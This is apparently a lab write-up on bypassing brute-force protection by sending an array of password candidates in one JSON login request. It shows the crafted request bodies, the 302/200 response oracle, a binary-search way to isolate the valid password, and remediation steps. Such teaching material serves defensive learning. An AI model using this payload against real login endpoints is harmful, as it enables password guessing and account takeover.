# Broken Brute-Force Protection, Multiple Credentials Per Request

## Overview

This lab demonstrates a **brute-force protection bypass caused by insecure handling of JSON input**.

The login endpoint accepted credentials in JSON format. Although the application expected a single password value, the back-end also accepted an array of passwords.

This allowed multiple password candidates to be tested inside a **single HTTP request**, effectively bypassing request-based brute-force protection.

---

## Vulnerability

The login request used JSON:

```http
POST /login HTTP/2
Host: <lab-host>
Content-Type: application/json

{
  "username": "test",
  "password": "test"
}
```

The expected type of the `password` field was a string.

However, the back-end also accepted a JSON array:

```json
{
  "username": "carlos",
  "password": [
    "wrong1",
    "wrong2"
  ]
}
```

The server returned a normal response instead of rejecting the malformed input.

This indicated that the application did not strictly validate the expected data type.

---

## Testing Multiple Passwords

The password field was then populated with multiple candidate values:

```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "qwerty",
    "12345678"
  ]
}
```

Instead of treating the array as invalid input, the back-end evaluated multiple password candidates.

This meant that several authentication attempts could effectively occur during one HTTP request.

---

## Exploitation

The complete password wordlist was inserted into the JSON array:

```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "...",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
  ]
}
```

The request produced:

```http
HTTP/2 302 Found
```

indicating successful authentication.

Therefore, at least one password in the supplied array was valid for the `carlos` account.

The application authenticated the request even though the client had supplied many password candidates simultaneously.

---

## Why the Attack Worked

A typical brute-force protection mechanism may count failed authentication attempts based on HTTP requests:

```text
Request 1 → password1
Request 2 → password2
Request 3 → password3
Request 4 → blocked
```

This assumes that:

```text
1 HTTP request = 1 password attempt
```

That assumption was false.

The vulnerable application effectively allowed:

```text
1 HTTP request
      |
      v
password1
password2
password3
password4
...
password100
```

Therefore:

```text
Rate limit sees:
1 request

Authentication logic processes:
many password candidates
```

The brute-force protection operated at the wrong abstraction layer.

---

## Root Cause

The vulnerability resulted from a combination of:

### 1. Weak input type validation

The application expected:

```json
"password": "string"
```

but accepted:

```json
"password": [
  "value1",
  "value2",
  "value3"
]
```

### 2. Backend logic that processed multiple values

Instead of rejecting the array, the application evaluated its contents as candidate passwords.

### 3. Request-based brute-force protection

The anti-brute-force mechanism counted HTTP requests rather than actual authentication attempts.

This created the condition:

```text
Multiple credential checks
        +
One HTTP request
        =
Rate-limit bypass
```

---

## Authentication Oracle

The response itself revealed whether at least one password in the array was valid.

Incorrect password set:

```http
HTTP/2 200 OK
```

Password array containing the correct password:

```http
HTTP/2 302 Found
```

Therefore:

```text
302 response
     ↓
At least one candidate password is valid
```

This acts as an authentication oracle.

---

## Identifying the Exact Password

Knowing the exact password was not required to solve the lab because the successful request already created an authenticated session.

However, if the exact credential needed to be identified, the password list could be divided into smaller groups.

For example:

```text
100 passwords
     |
     v
Test first 50
  /       \
302       200
 |         |
Valid     Valid password
password  is in second half
is here
```

The successful subset could then be repeatedly divided:

```text
100
 ↓
50
 ↓
25
 ↓
12
 ↓
6
 ↓
3
 ↓
1
```

This provides a binary-search-like method for identifying the exact valid password using relatively few requests.

---

## Attack Chain

The complete attack was:

```text
Login endpoint
      |
      v
Observe JSON credentials
      |
      v
Replace password string with array
      |
      v
Server accepts array
      |
      v
Insert entire password wordlist
      |
      v
One HTTP request contains many password guesses
      |
      v
Request-based rate limiting bypassed
      |
      v
302 Found
      |
      v
Authenticated as Carlos
```

---

## Impact

An attacker could bypass brute-force protections and test a large number of passwords using very few HTTP requests.

Potential consequences include:

* password brute forcing;
* account takeover;
* bypass of request-based rate limiting;
* bypass of IP-based authentication thresholds;
* compromise of privileged accounts;
* increased effectiveness of credential attacks.

The severity increases significantly when weak or common passwords are in use.

---

## Remediation

### Enforce strict input types

The application should reject unexpected JSON structures.

For example, if `password` must be a string:

```json
{
  "password": "example"
}
```

then requests containing:

```json
{
  "password": [
    "example1",
    "example2"
  ]
}
```

should be rejected with an appropriate client error.

---

### Count actual authentication attempts

Brute-force defenses should not assume that one HTTP request corresponds to exactly one credential attempt.

Rate limiting should be enforced around the authentication operation itself.

---

### Use schema validation

JSON input should be validated against a strict schema before it reaches authentication logic.

For example:

```text
username → required string
password → required string
```

Unexpected arrays, objects, null values, or alternate types should be rejected.

---

### Apply layered brute-force protection

Recommended controls include:

* per-account throttling;
* IP-based throttling;
* progressive delays;
* anomaly detection;
* multi-factor authentication;
* monitoring for unusual credential submission patterns.

---

## Key Takeaway

When testing JSON-based authentication endpoints, do not only modify the values.

Also modify the **data types and structure**.

For example:

```json
"password": "test"
```

can be tested as:

```json
"password": ["test"]
```

or other unexpected JSON types.

The key question is:

> Does the back-end strictly validate the expected input type, or can one request trigger multiple authentication attempts?

If multiple credentials can be processed inside a single request, request-based brute-force protections may be bypassed.
